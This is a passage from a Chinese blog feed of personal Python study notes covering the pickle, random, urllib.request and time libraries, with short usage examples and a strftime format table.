      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle 库</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/pickle%E5%BA%93/pickle%20%E5%BA%93/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/pickle%E5%BA%93/pickle%20%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>将文本信息转变为二进制数据流存储在一个文件中，便于下次使用</p><h2 id="二、常用函数："><a href="#二、常用函数：" class="headerlink" title="二、常用函数："></a>二、常用函数：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dump(object, file, protocol=None)<br></code></pre></td></tr></table></figure><ul><li>必填参数 obj 表示将要封装的对象</li><li>必填参数 file 表示 object 要写入的文件对象，file 必须以二进制模式打开，即 wb</li><li>可选参数 protocol 表示告知 pickle 使用的协议，支持的协议有 0，1，2，3 ，默认的协议是添加在 Python 3 中的协议 3。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">load(file)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  从字节对象中读取被封装的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dumps(object)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  将 object 对象序列化并返回一个 byte 对象，而不是存入文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">loads(bytes_object)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  从字节对象中读取被封装的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">My_list = (&#x27;this is a string&#x27;, 42, [1, 2, 3], None)<br>pickle_file = open (&#x27;My_list.pkl&#x27;, &#x27;wb&#x27;)<br>pickle.dump (My_list, pickle_file)<br>pickle_file.close()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  把 My_list 列表中的值写入到 pickle_file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pickle_file.close()<br>pickle_file2 = open (&#x27;my_list.pkl&#x27;, &#x27;rb&#x27;)<br>i = pickle.load(pickle_file2)<br><br>print (i)<br>pickle_file2.close()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  将读序列化读出的 pickle_file2 值，赋值给 i</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>random 库</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/random%E5%BA%93/random/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/random%E5%BA%93/random/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>该库用来生成伪随机数<a href="%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%9A%E5%B9%B6%E4%B8%8D%E6%98%AF%E7%9C%9F%E6%AD%A3%E7%9A%84%E9%9A%8F%E6%9C%BA%EF%BC%8C%E4%BD%86%E5%85%B7%E6%9C%89%E7%B1%BB%E4%BC%BC%E4%BA%8E%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E7%BB%9F%E8%AE%A1%E7%89%B9%E5%BE%81%EF%BC%8C%E5%A6%82%E5%9D%87%E5%8C%80%E6%80%A7%E3%80%81%E7%8B%AC%E7%AB%8B%E6%80%A7%E7%AD%89%E3%80%82">^1</a></p><h2 id="二、常用函数："><a href="#二、常用函数：" class="headerlink" title="二、常用函数："></a>二、常用函数：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">random.randint(1, 10)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F; 返回一个 1-10 的随机数整数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">randrange(start, stop, step)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F; 返回一个随机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">random()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F; 返回（0.0，1.0）范围内的下一随机浮点数（不接受参数）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uniform(1, 10)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F; 返回一个 1-10 的随机浮点数</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>urllib.request 库</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/urllib%E5%BA%93/urllib.request/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/urllib%E5%BA%93/urllib.request/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>urllib.request 模块提供了访问 URL 的相关功能</p><h2 id="二、常用函数"><a href="#二、常用函数" class="headerlink" title="二、常用函数"></a>二、常用函数</h2><p><code>urllib.request.urlopen(&quot;http://httpbin.org&quot;, timeout=1)</code><br>&emsp; &#x2F;&#x2F;  访问网页，并设置1秒的超时时间（urlopen 只能实现最基本的请求）</p><p><strong>读：</strong></p><ul><li><code>.read()</code>               &emsp; &#x2F;&#x2F;  读取网页（二进制）</li><li><code>.decode(&#39;utf-8&#39;)</code>      &emsp; &#x2F;&#x2F;  以 utf-8 解码网页</li><li><code>.geturl()</code>     &emsp; &#x2F;&#x2F;  获取访问的 URL</li></ul><p><strong>信息：</strong></p><ul><li><code>.info()</code>       &emsp; &#x2F;&#x2F;  获取网响应页的 Headers 信息</li><li><code>.headers</code>&emsp; &#x2F;&#x2F;  获取网页响应的 Headers 信息</li><li><code>.getheaders()</code>&emsp; &#x2F;&#x2F;  获取网页响应的 Headers 信息（以列表形式返回）</li><li><code>.getheader(name=&quot;Content-Type&quot;)</code>&emsp; &#x2F;&#x2F;  获取网页响应的 Headers 信息（查看指定的属性）</li><li><code>.version</code>    &emsp; &#x2F;&#x2F;  查看 HTTP 使用的版本协议号</li></ul><p><strong>状态码：</strong></p><ul><li><code>.getcode()</code>    &emsp; &#x2F;&#x2F;  获取当前访问的状态码</li><li><code>.status</code>&emsp; &#x2F;&#x2F;  获取当前访问的状态码</li><li><code>.reason</code>&emsp; &#x2F;&#x2F;  获取当前访问的状态码（如访问成功则返回 OK）</li></ul><p><code>urllib.request.Request(url=url, data=data, headers=header,  method=&quot;POST&quot;)</code></p><ul><li><code>.add_header</code>&emsp; &#x2F;&#x2F;  添加新的 Header（接受元组类型）</li></ul><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">url</td><td align="center">需请求的 url</td></tr><tr><td align="center">data</td><td align="center">必须为 bytes（字节流）类型，如为字典，可用 urllib.parse.urlencode()</td></tr><tr><td align="center">headers</td><td align="center">请求头</td></tr><tr><td align="center">origin_req_host</td><td align="center">指定请求方的 host 名称或 ip 地址</td></tr><tr><td align="center">unverifiable</td><td align="center">设置网页是否需要验证（默认为 Flase）</td></tr><tr><td align="center">method</td><td align="center">指定请求方法（如：GET、POST等）</td></tr></tbody></table><hr><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p>1、读取网页，并以 utf-8 格式解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  读取网页，并以 utf-8 格式解码<br>urllib.request.urlopen(&quot;http://httpbin.org&quot;).read().decode(&#x27;utf-8&#x27;)<br></code></pre></td></tr></table></figure><p>2、获取访问的 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  获取访问的 URL<br>urllib.request.urlopen(&quot;http://httpbin.org&quot;).geturl()<br></code></pre></td></tr></table></figure><p>3、获取 Headers 信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  获取 Headers 信息<br>urllib.request.urlopen(&quot;http://httpbin.org&quot;).info()<br></code></pre></td></tr></table></figure><p>4、获取访问的状态码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  获取访问的状态码<br>urllib.request.urlopen(&quot;http://httpbin.org&quot;).getcode()<br></code></pre></td></tr></table></figure><p>5、指定 Headers 访问网页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import urllib.request<br><br>#  指定访问的 URL<br>url = &quot;http://httpbin.org/get&quot;<br><br>#  指定访问的 Headers<br>header = &#123;<br>    &quot;Host&quot;: &quot;httpbin.org&quot;,<br>    &quot;Referer&quot;: &quot;http://httpbin.org/&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 99.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;,<br>&#125;<br><br>#  使用指定的 Headers 访问网页<br>test = urllib.request.Request(url=url, headers=header)<br><br>#  以 utf-8 的格式打印出访问的页面<br>test_2 = urllib.request.urlopen(test).read().decode(&quot;utf-8&quot;)<br>print (test_2)<br></code></pre></td></tr></table></figure><p>6、发送带参数的 GET 请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import urllib.request<br>import urllib.parse<br><br>#  指定访问的 URL<br>url = &quot;http://httpbin.org/get&quot;<br><br>#  指定访问的 Headers<br>header = &#123;<br>    &quot;Host&quot;: &quot;httpbin.org&quot;,<br>    &quot;Referer&quot;: &quot;http://httpbin.org/&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 99.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;,<br>&#125;<br><br>#  设置需传递的参数（使用 urlencode 将字典转换成可提交的参数，如：a=test_1&amp;b=test_2）<br>data = urllib.parse.urlencode(&#123;&#x27;a&#x27;:&#x27;test_1&#x27;, &#x27;b&#x27;:&#x27;test_2&#x27;&#125;)<br>url = url + &quot;?&quot; + data<br><br>#  使用指定的 Headers 访问网页<br>test = urllib.request.Request(url=url, headers=header)<br><br>#  以 utf-8 的格式打印出访问的页面<br>test_2 = urllib.request.urlopen(test).read().decode(&quot;utf-8&quot;)<br>print (test_2)<br></code></pre></td></tr></table></figure><p>7、发送带参数的 POST 请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import urllib.request<br>import urllib.parse<br><br>#  指定访问的 URL<br>url = &quot;http://httpbin.org/post&quot;<br><br>#  指定访问的 Headers<br>header = &#123;<br>    &quot;Host&quot;: &quot;httpbin.org&quot;,<br>    &quot;Origin&quot;: &quot;http://httpbin.org&quot;,<br>    &quot;Referer&quot;: &quot;http://httpbin.org/&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 99.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;,<br>&#125;<br><br>#  设置需传递的参数（使用 urlencode 将字典转换成可提交的参数，如：a=test_1&amp;b=test_2）<br>data = urllib.parse.urlencode(&#123;&#x27;a&#x27;:&#x27;test_1&#x27;, &#x27;b&#x27;:&#x27;test_2&#x27;&#125;)<br>#  将序列化后的字符串转换成二进制数据（POST 请求携带的参数是二进制）<br>data = bytes(data, encoding=&#x27;utf-8&#x27;)<br><br>#  使用指定的 Headers 访问网页<br>test = urllib.request.Request(url=url, headers=header, data = data, method=&quot;POST&quot;)<br>#  指定新的 Headers（接受元组类型（会替换掉对应的项））<br>test.add_header(&quot;User-Agent&quot;, &quot;Mozilla/99.0 (Windows NT 99.0; Win99; x99) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;,<br>)<br>#  以 utf-8 的格式打印出访问的页面<br>test_2 = urllib.request.urlopen(test).read().decode(&quot;utf-8&quot;)<br>print (test_2)<br></code></pre></td></tr></table></figure><p>8、设置全局代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import urllib.request<br><br>#  需访问测试页面<br>url = &quot;http://httpbin.org/ip&quot;<br><br>#  设置代理 IP<br>ip = &#123;&quot;http&quot;:&quot;101.37.118.54:8888&quot;&#125;<br>proxy_ip = urllib.request.ProxyHandler(ip)<br><br>#  使用 build_opener() 构建一个 opener 对象<br>opener = urllib.request.build_opener(proxy_ip)<br>#  设置新的 Headers<br>header = (&#x27;User-Agent&#x27;,&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36&#x27;)<br>opener.addheaders = [header]<br>urllib.request.install_opener(opener)<br><br>#  访问测试的页面<br>response = urllib.request.urlopen(url)<br>#  以 utf-8 的格式打印出访问的页面<br>html = response.read().decode(&#x27;utf-8&#x27;)<br>print (html)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>time 库</title>
      <link href="/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/time%E5%BA%93/time%20%E5%BA%93/"/>
      <url>/2021/02/09/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/time%E5%BA%93/time%20%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p><strong>时间戳：</strong></p><ul><li>时间戳是指 1970 年 01 月 01 日 00 时 00 分 00 秒起至现在的总毫秒数。</li><li>1970年之前的日期就无法以此表示。太遥远的日期也不行， UNIX 和 Windows 只支持到 2038 年。</li></ul><p><strong>为什么会生成13位的时间戳，13位的时间戳和10时间戳分别是怎么来的？</strong></p><ul><li>java的date默认精度是毫秒，也就是说生成的时间戳就是13位的，而像 c++ 或者 Python、php 生成的时间戳默认就是 10 位的，因为其精度是秒。</li></ul><p><strong>13位时间戳如何转换成10位时间戳？</strong></p><ul><li>第一种：将13位的时间戳最后三位数字截取</li><li>第二种：将13位时间戳除以1000取整。</li></ul><p><strong>Unix纪元时间：</strong></p><ul><li>很多编程语言起源于UNIX系统，而UNIX系统认为1970年1月1日0时0分0秒是时间纪元，所以常说的UNIX时间戳是以1970年1月1日0时0分0秒为计时起点时间的。</li></ul><p><strong>UTC（协调世界时）：</strong></p><ul><li>世界统一时间、世界标准时间、国际协调时间。简称 UTC，在中国为 UTC+8（小时）</li></ul><p><strong>DST（夏令时）：</strong></p><ul><li>时间使用策略。人为的将时间调快一小时，可以使人早睡早起，减少照明量，以充分利用光照资源从而节约照明用电。</li></ul><p><strong>时间元组：</strong></p><ul><li>以元组的方式表示时间，如：(2020, 1, 2, 3, 40, 50, 6, 7, 0)</li></ul><p><strong>时间元组对照表：</strong></p><table><thead><tr><th align="center">索引值</th><th align="center">属性</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">年</td><td align="center">4位数（2020）</td></tr><tr><td align="center">1</td><td align="center">月</td><td align="center">1~12</td></tr><tr><td align="center">2</td><td align="center">日</td><td align="center">1~31</td></tr><tr><td align="center">3</td><td align="center">时</td><td align="center">0~23</td></tr><tr><td align="center">4</td><td align="center">分</td><td align="center">0~59</td></tr><tr><td align="center">5</td><td align="center">秒</td><td align="center">0~61（闰秒 ^[1]）</td></tr><tr><td align="center">6</td><td align="center">星期几</td><td align="center">0~6（0表示星期一）</td></tr><tr><td align="center">7</td><td align="center">一年中的第几天</td><td align="center">1~366</td></tr><tr><td align="center">8</td><td align="center">是否为夏令时</td><td align="center">0，1，-1（-1代表夏令时）</td></tr></tbody></table><hr><h2 id="二、常用函数"><a href="#二、常用函数" class="headerlink" title="二、常用函数"></a>二、常用函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test = (2020, 2, 20, 2, 20, 20, 0, 0, 0)<br>time.asctime(test)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F; 接受时间元组，并以可读的形式返回“Thu Feb 20 02:20:20 2020“（2020年2月20日 星期四 2时20分20秒）的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.ctime()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  获取本地时间，并以可读的形式返回（“Thu Feb 20 02:20:20 2020“）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test = (2020, 2, 20, 2, 20, 20, 0, 0, 0)<br>time.mktime(test)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  接受时间元组并返回时间戳（1970纪元后经过的浮点秒数）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.localtime()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  返回本地的时间（UTC+8）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.localtime(0)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  返回到Unix纪元时间向后偏移0秒的时间，由于当前属于东八区所以+8小时（1970&#x2F;1&#x2F;1 8:0:0 星期四 一年中的第一天）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.gmtime()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  返回本地的时间（UTC时间）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.gmtime(0)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  返回Unix纪元时间向后偏移0秒的时间（1970&#x2F;1&#x2F;1 0:0:0 星期四 一年中的第一天）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test = (2020, 2, 20, 2, 20, 20, 0, 0, 0)<br>time.mktime(test)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  获取 test 时间元组的时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.time()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  返回当前时间的时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test = (2020, 2, 20, 2, 20, 20, 0, 0, 0)<br>time.strftime(&quot;%Y-%m-%d  %H:%M:%S  %A&quot;, test)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  格式化时间字符串</p><body link="#0563C1" vlink="#954F72"><table border="0" cellpadding="0" cellspacing="0" width="529" style="border-collapse: collapse;table-layout:fixed;width:397pt"> <colgroup><col width="33" style="mso-width-source:userset;mso-width-alt:1166;width:25pt"> <col width="54" style="mso-width-source:userset;mso-width-alt:1934;width:41pt"> <col width="442" style="mso-width-source:userset;mso-width-alt:15701;width:331pt"> </colgroup><tbody><tr height="18" style="height:13.8pt">  <td height="18" class="xl83" width="33" style="height:13.8pt;width:25pt">　</td>  <td class="xl83" width="54" style="border-left:none;width:41pt">格式</td>  <td class="xl83" width="442" style="border-left:none;width:331pt">说明</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td rowspan="3" height="123" class="xl65" style="height:93.15pt;border-top:none">年</td>  <td class="xl67" width="54" style="border-top:none;border-left:none;width:41pt">%Y</td>  <td class="xl69" width="442" style="border-top:none;border-left:none;width:331pt">四个数字表示的年份（2020）</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl67" width="54" style="height:31.05pt;border-top:none;  border-left:none;width:41pt">%y</td>  <td class="xl69" width="442" style="border-top:none;border-left:none;width:331pt">两个数字表示的年份（20）</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl67" width="54" style="height:31.05pt;border-top:none;  border-left:none;width:41pt">%j</td>  <td class="xl69" width="442" style="border-top:none;border-left:none;width:331pt">一年中的第几天（001-366）</td> </tr> <tr height="22" style="mso-height-source:userset;height:16.2pt">  <td colspan="3" height="22" class="xl84" style="height:16.2pt">　</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td rowspan="3" height="123" class="xl85" style="height:93.15pt">月</td>  <td class="xl72" width="54" style="width:41pt">%m</td>  <td class="xl73" width="442" style="border-left:none;width:331pt">月份（0, 12）</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl66" width="54" style="height:31.05pt;border-top:none;  width:41pt">%b</td>  <td class="xl68" width="442" style="border-top:none;border-left:none;width:331pt">月份的英文单词缩写：如一月，则返回  <font class="font7"><span style="mso-spacerun:yes">&nbsp;</span>' </font><font class="font8">Jan</font><font class="font7"> '</font></td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl74" width="54" style="height:31.05pt;border-top:none;  width:41pt">%B</td>  <td class="xl75" width="442" style="border-top:none;border-left:none;width:331pt">月份的英文单词全拼：如一月，则返回  <font class="font7"><span style="mso-spacerun:yes">&nbsp;</span>' </font><font class="font8">January</font><font class="font7"> '</font></td> </tr> <tr height="18" style="height:13.8pt">  <td colspan="3" height="18" class="xl84" style="height:13.8pt">　</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl78" style="height:31.05pt">日</td>  <td class="xl79" width="54" style="width:41pt">%d</td>  <td class="xl80" width="442" style="border-left:none;width:331pt">当前月的第几天（01-31）</td> </tr> <tr height="21" style="mso-height-source:userset;height:15.6pt">  <td colspan="3" height="21" class="xl84" style="height:15.6pt">　</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td rowspan="3" height="123" class="xl85" style="height:93.15pt">时</td>  <td class="xl76" width="54" style="width:41pt">%H</td>  <td class="xl77" width="442" style="border-left:none;width:331pt">以24小时制表示当前小时</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%I</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">以12小时制表示当前小时</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%p</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">返回上午（AM）或者下午（PM）</td> </tr> <tr height="19" style="height:14.4pt">  <td colspan="3" height="19" class="xl84" style="height:14.4pt">　</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl65" style="height:31.05pt;border-top:none">分</td>  <td class="xl71" width="54" style="width:41pt">%M</td>  <td class="xl70" width="442" style="border-left:none;width:331pt">返回分钟数（0，59）</td> </tr> <tr height="19" style="height:14.4pt">  <td colspan="3" height="19" class="xl84" style="height:14.4pt">　</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl65" style="height:31.05pt;border-top:none">秒</td>  <td class="xl71" width="54" style="width:41pt">%S</td>  <td class="xl70" width="442" style="border-left:none;width:331pt">返回秒数（0，61）</td> </tr> <tr height="19" style="height:14.4pt">  <td colspan="3" height="19" class="xl84" style="height:14.4pt">　</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td rowspan="5" height="205" class="xl65" style="height:155.25pt;border-top:none">星期</td>  <td class="xl71" width="54" style="width:41pt">%U</td>  <td class="xl70" width="442" style="border-left:none;width:331pt">返回现在是当前年的第几周（周日为第一天）</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%W</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">返回现在是当前年的第几周（周一为第一天）</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%w</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">返回当前是星期几（0~6），6表示星期天</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%a</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">星期的英文单词缩写：如星期一，则返回<span style="mso-spacerun:yes">&nbsp; </span>' Mon '<span style="mso-spacerun:yes">&nbsp;</span></td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl81" width="54" style="height:31.05pt;border-top:none;  width:41pt">%A</td>  <td class="xl82" width="442" style="border-top:none;border-left:none;width:331pt">星期的英文单词全拼：如星期一，则返回<span style="mso-spacerun:yes">&nbsp; </span>' Monday '<span style="mso-spacerun:yes">&nbsp;</span></td> </tr> <tr height="18" style="height:13.8pt">  <td colspan="3" height="18" class="xl84" style="height:13.8pt">　</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td rowspan="5" height="205" class="xl85" style="height:155.25pt">其他</td>  <td class="xl76" width="54" style="width:41pt">%c</td>  <td class="xl77" width="442" style="border-left:none;width:331pt">返回本地相应的日期和时间如<span style="mso-spacerun:yes">&nbsp; </span>' Fri Feb 20 02:20:20 2020 '</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%x</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">日期的字符串表示<span style="mso-spacerun:yes">&nbsp; </span>' <font class="font7">02/20/20</font><font class="font8"> '<span 